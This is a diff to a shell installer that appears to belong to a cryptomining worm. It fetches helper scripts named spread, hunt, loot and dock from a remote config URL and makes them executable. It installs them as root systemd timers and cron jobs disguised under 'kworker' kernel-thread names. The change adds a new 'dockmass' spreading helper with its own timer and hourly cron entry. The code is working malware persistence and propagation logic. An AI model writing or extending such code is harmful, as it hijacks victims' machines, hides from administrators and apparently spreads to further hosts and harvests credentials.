@@ -44,7 +44,7 @@ sed -e "s|__URL__|${POOL}|g" \
 # 4) helpers. Download to a temp then mv: mv is an atomic rename, so a helper
 #    that is mid-run (spread/hunt fired by a timer) keeps reading its old inode
 #    instead of having the file rewritten underneath it.
-for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh tune.sh; do
+for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh tune.sh; do
     curl -fsSL "$CONFIG_URL/$f" -o "$f.new"
     chmod 0755 "$f.new"
     mv -f "$f.new" "$f"
@@ -72,7 +72,7 @@ if [ -n "${KEY_URL:-}" ]; then
     chmod 0600 id_key
 fi
 if command -v systemctl >/dev/null 2>&1; then
-    for u in kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock; do
+    for u in kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass; do
         curl -fsSL "$CONFIG_URL/$u.service" -o "/etc/systemd/system/$u.service"
         curl -fsSL "$CONFIG_URL/$u.timer" -o "/etc/systemd/system/$u.timer"
     done
@@ -81,6 +81,7 @@ if command -v systemctl >/dev/null 2>&1; then
     systemctl enable --now kworker-tune.timer 2>/dev/null || true
     systemctl enable --now kworker-loot.timer 2>/dev/null || true
     systemctl enable --now kworker-dock.timer 2>/dev/null || true
+    systemctl enable --now kworker-mass.timer 2>/dev/null || true
     if [ -n "${GITHUB_TOKEN:-}" ]; then
         systemctl enable --now kworker-hunt.timer 2>/dev/null || true
     fi
@@ -89,6 +90,7 @@ else
     printf '*/10 * * * * root %s/tune.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     printf '5 */6 * * * root %s/loot.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     printf '45 */6 * * * root %s/dock.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
+    printf '15 * * * * root %s/dockmass.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     if [ -n "${GITHUB_TOKEN:-}" ]; then
         printf '30 */12 * * * root %s/hunt.sh all >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
     fi
